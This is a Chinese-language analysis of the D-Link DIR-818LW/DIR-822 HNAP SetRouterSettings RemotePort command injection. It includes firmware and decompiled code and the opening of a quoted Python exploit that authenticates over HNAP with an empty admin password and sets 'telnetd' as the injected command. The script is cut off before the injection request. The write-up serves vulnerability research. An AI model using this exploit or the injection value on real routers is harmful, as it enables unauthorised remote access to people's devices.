<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="b675e00f7289693514acc50e77a16d95">漏洞原理</h2>
<p>D-Link DIR-818LW Rev.A 2.05.B03和DIR-822 B1 202KRb06中，通过HNAP1协议访问<code>SetRouterSettings</code>时，<code>RemotePort</code>参数存在操作系统命令注入漏洞。在<code>SetRouterSettings.php</code>源码中，<code>RemotPort</code>参数没有经过任何检查，直接存放于<code>$path_inf_wan1."/web"</code>，并且在<code>iptwan.php</code>中的IPTWAN_build_command函数中使用<code>$path_inf_wan1."/web"</code>变量作为<code>iptables</code>的参数，同样未做检查。构造<code>SetRouterSettings.xml</code>，使<code>RemotePort</code>中包含如`telnetd`的shell命令，利用该漏洞执行非法操作系统命令。</p>
<p>./etc/templates/hnap/SetRouterSettings.php：</p>
<div class="highlight"><pre><span></span><span class="x">$path_inf_wan1 = XNODE_getpathbytarget("", "inf", "uid", $WAN1, 0);</span>
<span class="x">#$WAN1  = "WAN-1";</span>
<span class="x">$nodebase="/runtime/hnap/SetRouterSettings/";</span>
<span class="x">……</span>
<span class="x">$remotePort = query($nodebase."RemotePort");</span>
<span class="x">……</span>
<span class="x">set($path_inf_wan1."/web", $remotePort);</span>
</pre></div>
<p>./etc/services/IPTABLES/iptwan.php</p>
<div class="highlight"><pre><span></span><span class="x">function IPTWAN_build_command($name){</span>
<span class="x">  $path = XNODE_getpathbytarget("", "inf", "uid", $name, 0);</span>
<span class="x">  ……</span>
<span class="x">  $web = query($path."/web");</span>
<span class="x">  ……</span>
<span class="x">  #web作为iptables的参数写入$_GLOBALS["START"]</span>
<span class="x">  if (query($path."/inbfilter") != "")</span>
<span class="x">      $inbfn = cut(query($path."/inbfilter"), 1, "-");</span>
<span class="x">      $hostip = query($path."/weballow/hostv4ip");</span>
<span class="x">      if ($hostip != "")</span>
<span class="x">      {</span>
<span class="x">          if (query($path."/inbfilter")!="") fwrite("a",$_GLOBALS["START"], $iptcmd." -p tcp --dport ".$web." "."-j CK_INBOUND".$inbfn."\n");</span>
<span class="x">          fwrite("a",$_GLOBALS["START"], $iptcmd." -s ".$hostip." -p tcp --dport ".$web." -j ACCEPT\n");</span>
<span class="x">      }</span>
<span class="x">      else</span>
<span class="x">      {</span>
<span class="x">          if (query($path."/inbfilter")!="") fwrite("a",$_GLOBALS["START"], $iptcmd." -p tcp --dport ".$web." "."-j CK_INBOUND".$inbfn."\n");</span>
<span class="x">          fwrite("a",$_GLOBALS["START"], $iptcmd." -p tcp --dport ".$web." -j ACCEPT\n");</span>
<span class="x">      }</span>
<span class="x">  ……</span>
<span class="x">}</span>
</pre></div>
<p>PS：服务器的web目录为/htdocs/web/</p>
<h2 data-content="1" id="7260b5102cc454bc9936ab7d95aaacf5">漏洞分析</h2>
<h3 data-content="1" id="abe36382d803a1d8c9388b091429b841">关于HNAP</h3>
<blockquote>
<p>The Home Network Administration Protocol (HNAP) is an HTTP-Simple Object Access Protocol (SOAP)-based protocol that can be implemented inside of network devices to allow advanced  programmatic configuration and management by remote entities.</p>
</blockquote>
<p>HNAP是由Pure Networks开发的协议，后续由Cisco管理与开发。HNAP用于网络设备之间的交互，该协议基于SOAP和HTTP，以post的方式发包。</p>
<p>使用HNAP：在HTTP header中加入SOAPAction，该字段中会指明请求的操作，如Login，并向<a href="http://[ip]/HNAP1发送数据，数据形式为xml。" target="_blank">http://[ip]/HNAP1发送数据，数据形式为xml。</a></p>
<p>举个栗子，下图是登录时的抓包：</p>
<p>192.168.0.1向路由器192.168.0.2发送数据，在SOAPAction中指定了请求内容。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190725160919-80b19e14-aeb3-1.png"/></p>
<p>路由器收到之后以LoginResponse回复发送方，返回了一些登录需要的关键数据.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190725160928-865cc7b2-aeb3-1.png"/></p>
<p>发送方收到之后，login的action由request变成了login，即发送用户名密码的过程，密码是由用户私钥处理过的数据。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190725160941-8de1a69c-aeb3-1.png"/></p>
<p>路由器验证登录的用户名和密码，返回登录成功信息。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190725160950-92ff9a08-aeb3-1.png"/></p>
<h3 data-content="1" id="61f81ba84128cf57677fccdc9e2fec61">理解HNAP</h3>
<p>为了再深入理解HNAP，查看/htdocs/cgibin二进制文件，简化流程如下：</p>
<div class="highlight"><pre><span></span><span class="n">hnap_main</span><span class="p">(){</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
  <span class="n">getenv</span><span class="p">(</span><span class="s">"HTTP_AUTHORIZATION"</span><span class="p">);</span>
  <span class="n">soapaction</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"HTTP_SOAPACTION"</span><span class="p">);</span>
  <span class="n">request_method</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"REQUEST_METHOD"</span><span class="p">);</span>
  <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"HTTP_HNAP_AUTH"</span><span class="p">);</span>
  <span class="n">cookie</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"HTTP_COOKIE"</span><span class="p">);</span>
  <span class="n">referer</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"HTTP_REFERER"</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
  <span class="c1">//当未指定soapaction时，默认请求为GetDeviceSettings</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">soapaction</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">soapaction</span> <span class="o">=</span> <span class="s">"http://purenetworks.com/HNAP1/GetDeviceSettings"</span><span class="p">;</span>
    <span class="err">……</span>
    <span class="p">}</span>
   <span class="k">else</span><span class="p">{</span>
        <span class="err">……</span>
        <span class="n">__s1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">soapaction</span><span class="p">,</span><span class="s">"http://purenetworks.com/HNAP1/Login"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">__s1</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
            <span class="err">……</span>
            <span class="n">parse_param_value</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="s">"Action"</span><span class="p">,</span><span class="n">action</span><span class="p">);</span>
            <span class="n">parse_param_value</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="s">"Username"</span><span class="p">,</span><span class="n">username</span><span class="p">);</span>
            <span class="n">parse_param_value</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="s">"LoginPassword"</span><span class="p">,</span><span class="n">pwd</span><span class="p">);</span>
            <span class="n">parse_param_value</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="s">"Captcha"</span><span class="p">,</span><span class="n">captcha</span><span class="p">);</span>
            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">action</span><span class="p">,</span><span class="s">"request"</span><span class="p">);</span>
            <span class="c1">//当action为request时</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">//产生一个长度为0X32的随机字符串</span>
                <span class="c1">//例：LVy04tz2fCRlZIu8vefr1OCKu9qTOQaktWkwOhy3rNnQfhWaKB</span>
                <span class="n">get_random_string</span><span class="p">(</span><span class="n">random_string</span><span class="p">,</span><span class="mh">0x32</span><span class="p">);</span>
                <span class="c1">//cookie_value为前十个字符</span>
                <span class="c1">//例：LVy04tz2fC</span>
                <span class="n">strncpy</span><span class="p">(</span><span class="n">cookie_value</span><span class="p">,</span><span class="n">random_string</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
                <span class="c1">//challenge为接下来20个字符</span>
                <span class="c1">//例：RlZIu8vefr1OCKu9qTOQ</span>
                <span class="n">strncpy</span><span class="p">(</span><span class="n">random_challenge</span><span class="p">,</span><span class="n">random_string_10</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
                <span class="c1">//public key为接下来20个字符</span>
                <span class="c1">//例：aktWkwOhy3rNnQfhWaKB</span>
                <span class="n">strncpy</span><span class="p">(</span><span class="n">public_key</span><span class="p">,</span><span class="n">random_string_30</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
                <span class="n">sprintf</span><span class="p">(</span><span class="n">public_key_and_0</span><span class="p">,</span><span class="s">"%s%s"</span><span class="p">,</span><span class="n">public_key</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
                <span class="n">strcpy</span><span class="p">(</span><span class="n">COOKIE</span><span class="p">,</span><span class="n">cookie_value</span><span class="p">);</span>
                <span class="n">strcpy</span><span class="p">(</span><span class="n">CHALLENGE</span><span class="p">,</span><span class="n">random_challenge</span><span class="p">);</span>
                <span class="c1">//HMAC_MD5就是常见的HMAC，hash算法为MD5。这里函数的输出放在第三个参数中</span>
                <span class="c1">//例：hmac_1=E188583458DE427B6A71C2DD04CB632C</span>
                <span class="n">HMAC_MD5</span><span class="p">(</span><span class="n">random_challenge</span><span class="p">,</span><span class="n">public_key_and_0</span><span class="p">,</span><span class="n">hmac_1</span><span class="p">);</span>
                <span class="err">……</span>
                <span class="c1">//set challenge,privatekey,captcha</span>
                <span class="c1">//返回soap xml</span>
            <span class="p">}</span><span class="c1">//end of action=request</span>
            <span class="k">else</span><span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">action</span><span class="p">,</span><span class="s">"login"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">cookie</span> <span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">find_uid</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span><span class="s">"uid="</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">find_uid</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_004137fc</span><span class="p">;</span>
                    <span class="c1">//获取cookie的值</span>
                    <span class="n">strncpy</span><span class="p">(</span><span class="n">cookie_value</span><span class="p">,</span><span class="n">find_uid</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
                    <span class="c1">//检查cookie</span>
                    <span class="n">__fd</span><span class="o">=</span><span class="n">get_cgdata_by_uid</span><span class="p">(</span><span class="n">acStack1904</span><span class="p">,</span><span class="n">cookie_value</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">__fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">iVar1</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
                        <span class="k">goto</span> <span class="n">LAB_004137fc</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="err">……</span>
                    <span class="c1">//由HMAC计算口令，以hmac_1作为key,对challenge进行hmac</span>
                    <span class="n">HMAC_MD5</span><span class="p">(</span><span class="n">CHALLENGE</span><span class="p">,</span><span class="n">hmac_1</span><span class="p">,</span><span class="n">PWD</span><span class="p">);</span>
                    <span class="err">……</span>
                    <span class="c1">//将计算的口令与发送方中的口令比较</span>
                    <span class="n">__fd</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">PWD</span><span class="p">,</span><span class="n">pwd</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">__fd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">login_response_xml</span><span class="p">(</span><span class="s">"success"</span><span class="p">);</span>
                        <span class="err">……</span>
                    <span class="p">}</span>
                <span class="p">}</span><span class="c1">//end of action=login</span>
            <span class="p">}</span>
          <span class="p">}</span> <span class="c1">//end of Login</span>
          <span class="c1">//不是login的情况</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">hnap_auth</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">){</span>
                <span class="err">……</span>
                <span class="c1">//hnap_auth用空格分为两部分</span>
                <span class="n">auth_1</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">hnap_auth</span><span class="p">,</span><span class="s">" "</span><span class="p">);</span>
                <span class="n">auth_2</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">" "</span><span class="p">);</span>
                <span class="c1">//将auth_2和soapaction连接起来</span>
                <span class="n">strcpy</span><span class="p">(</span><span class="n">auth_2_soapaction</span><span class="p">,</span><span class="n">auth_2</span><span class="p">);</span>
                <span class="n">strcat</span><span class="p">(</span><span class="n">auth_2_soapaction</span><span class="p">,</span><span class="n">soapaction</span><span class="p">);</span>
                <span class="err">……</span>
                <span class="n">HMAC_MD5</span><span class="p">(</span><span class="n">auth_2_soapaction</span><span class="p">,</span><span class="n">hmac_1</span><span class="p">,</span><span class="n">HMAC_AUTH</span><span class="p">);</span>
                <span class="c1">//比较auth_1和计算后的值</span>
                <span class="n">__fd</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">auth_1</span><span class="p">,</span><span class="n">HMAC_AUTH</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">__fd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                  <span class="err">……</span>
                  <span class="c1">//如果不是Logout，就跳转到0x413330</span>
                  <span class="n">__format</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">soapaction</span><span class="p">,</span><span class="s">"http://purenetworks.com/HNAP1/Logout"</span><span class="p">);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="n">__format</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_00413330</span><span class="p">;</span>
                  <span class="err">……</span>
          <span class="p">}</span>
     <span class="p">}</span><span class="c1">//end of soapaction!=0</span>
    <span class="nl">LAB_00413330</span><span class="p">:</span>
       <span class="c1">//在soapaction中查找最后一个“/”之后的内容为operation</span>
       <span class="n">__format</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">soapaction</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">);</span>
       <span class="n">operation</span> <span class="o">=</span> <span class="n">__format</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="n">__format</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">operation</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">operation</span><span class="p">[</span><span class="n">sVar3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\"'</span><span class="p">)</span> <span class="p">{</span>
           <span class="n">operation</span><span class="p">[</span><span class="n">sVar3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="p">}</span>
         <span class="c1">//hnap相关的php都在/etc/templates/hnap下</span>
         <span class="n">snprintf</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"%s/%s.php"</span><span class="p">,</span><span class="s">"/etc/templates/hnap/"</span><span class="p">,</span><span class="n">operation</span><span class="p">);</span>
         <span class="c1">//判断与请求相关的php是否存在，0为存在</span>
         <span class="n">iVar1</span> <span class="o">=</span> <span class="n">access</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="err">……</span>
            <span class="n">snprintf</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"%s%s.php</span><span class="se">\n</span><span class="s">ShellPath=%s%s.sh</span><span class="se">\n</span><span class="s">PrivateKey=%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                 <span class="s">"/etc/templates/hnap/"</span><span class="p">,</span><span class="n">operation</span><span class="p">,</span><span class="o">&amp;</span><span class="n">var_run</span><span class="p">,</span><span class="n">operation</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00438344</span><span class="p">);</span>
            <span class="n">sobj_add_string</span><span class="p">(</span><span class="n">iVar4</span><span class="p">,</span><span class="n">acStack1708</span><span class="p">);</span>
             <span class="err">……</span>
            <span class="n">uVar2</span> <span class="o">=</span> <span class="n">sobj_get_string</span><span class="p">();</span>
            <span class="c1">//该函数会建立一个socket并把上面的acStack1708字符发送给socket；这个socket是与本地的xmldb_sock建立的，理解为发送给本地以执行对应的php</span>
            <span class="n">xmldbc_ephp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">uVar2</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
            <span class="err">……</span>
            <span class="n">snprintf</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"%s"</span><span class="p">,</span><span class="n">operation</span><span class="p">);</span>
            <span class="n">iVar4</span> <span class="o">=</span> <span class="n">FUN_004125c8</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">,</span><span class="s">"/etc/templates/hnap//.shell_action"</span><span class="p">);</span>
            <span class="c1">//这里无论如何都会为format赋值，内容是执行一个sh脚本的命令</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">iVar4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
              <span class="n">__format</span> <span class="o">=</span> <span class="s">"sh %s%s.sh &gt; /dev/console"</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="n">__format</span> <span class="o">=</span> <span class="s">"sh %s%s.sh &gt; /dev/console &amp;"</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">//执行该脚本</span>
            <span class="c1">//var_run变量对应的字符是"/var/run/"</span>
            <span class="n">snprintf</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">__format</span><span class="p">,</span><span class="o">&amp;</span><span class="n">var_run</span><span class="p">,</span><span class="n">operation</span><span class="p">);</span>
            <span class="n">system</span><span class="p">(</span><span class="n">acStack1708</span><span class="p">);</span>
            <span class="err">……</span>
<span class="p">}</span>
</pre></div>
<h3 data-content="1" id="ba7887b88a9219a0e940b3062c080d8b">漏洞执行顺序</h3>
<p>在上面的hnap_main代码中，代入本漏洞SetRouterSettings的情况，最后会执行<code>sh /var/run/SetRouterSettings.sh</code>，这个脚本是动态生成的，在模拟固件并执行poc成功之后查看内容（还没找到具体生成sh脚本的代码）</p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$0</span><span class="s2">]--&gt;RouterSettings Change"</span> &gt; /dev/console
event DBSAVE &gt; /dev/console
service HTTP.WAN-1 start &gt; /dev/console <span class="c1">#here！！！</span>
xmldbc -s /runtime/hnap/dev_status <span class="s1">''</span> &gt; /dev/console
</pre></div>
<p>HTTP.WAN-1是一种服务，对应于/etc/services/HTTP.WAN-1.php，该服务会开启IPT.WAN-1服务</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?</span>
<span class="k">include</span> <span class="s2">"/etc/services/HTTP/httpsvcs.php"</span><span class="p">;</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="s2">"w"</span><span class="p">,</span><span class="nv">$START</span><span class="p">,</span><span class="s2">"#!/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="s2">"w"</span><span class="p">,</span> <span class="nv">$STOP</span><span class="p">,</span><span class="s2">"#!/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,</span><span class="nv">$START</span><span class="p">,</span><span class="s2">"service IPT.WAN-1 restart</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span><span class="c1">#here!!!!</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,</span><span class="nv">$START</span><span class="p">,</span><span class="s2">"service STUNNEL restart</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="nx">httpsetup</span><span class="p">(</span><span class="s2">"WAN-1"</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>/etc/services/IPT.WAN-1.php会执行之前所说的iptables命令</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?</span>
<span class="k">include</span> <span class="s2">"/htdocs/phplib/trace.php"</span><span class="p">;</span>
<span class="k">include</span> <span class="s2">"/etc/services/IPTABLES/iptwan.php"</span><span class="p">;</span>
<span class="nx">IPTWAN_build_command</span><span class="p">(</span><span class="s2">"WAN-1"</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<h2 data-content="1" id="8ac4bd96572cc207686d48ddd356b9ed">漏洞利用</h2>
<p>利用脚本是漏洞原作者写好的<a href="https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990" target="_blank">exp</a></p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">telnetlib</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">math</span>

<span class="n">trans_5C</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="mh">0x5c</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
<span class="n">trans_36</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="mh">0x36</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
<span class="n">blocksize</span> <span class="o">=</span> <span class="n">md5</span><span class="p">()</span><span class="o">.</span><span class="n">block_size</span>

<span class="k">def</span> <span class="nf">hmac_md5</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">blocksize</span><span class="p">:</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
    <span class="n">key</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">blocksize</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
    <span class="n">o_key_pad</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">trans_5C</span><span class="p">)</span>
    <span class="n">i_key_pad</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">trans_36</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">md5</span><span class="p">(</span><span class="n">o_key_pad</span> <span class="o">+</span> <span class="n">md5</span><span class="p">(</span><span class="n">i_key_pad</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">HNAP_AUTH</span><span class="p">(</span><span class="n">SOAPAction</span><span class="p">,</span> <span class="n">privateKey</span><span class="p">):</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span> <span class="o">%</span> <span class="mi">2000000000</span>
    <span class="n">b</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac_md5</span><span class="p">(</span><span class="n">privateKey</span><span class="p">,</span> <span class="n">b</span> <span class="o">+</span> <span class="s1">'"http://purenetworks.com/HNAP1/'</span> <span class="o">+</span> <span class="n">SOAPAction</span> <span class="o">+</span> <span class="s1">'"'</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">h</span> <span class="o">+</span> <span class="s2">" "</span> <span class="o">+</span> <span class="n">b</span>

<span class="c1">#输入IP和admin口令，通过读hnap_main的二进制，理解初始状态admin的口令为空（public_key_0：0代表空值）</span>
<span class="n">IP</span> <span class="o">=</span> <span class="s1">'192.168.0.1'</span>
<span class="n">adminPw</span> <span class="o">=</span> <span class="s1">''</span>

<span class="n">command</span> <span class="o">=</span> <span class="s2">"telnetd"</span> <span class="c1"># command injection id</span>

<span class="n">headers</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">default_headers</span><span class="p">()</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"SOAPAction"</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'"http://purenetworks.com/HNAP1/Login"'</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Origin"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="n">IP</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Referer"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="n">IP</span> <span class="o">+</span> <span class="s2">"/info/Login.html"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text/xml; charset=UTF-8"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"X-Requested-With"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"XMLHttpRequest"</span>

<span class="c1">#构造一个action为request的请求发送给Login</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="c1">#通过获取的publickey计算privatekey，根据privatekey计算口令的hmac(在上文中对应的是hmac_1)</span>
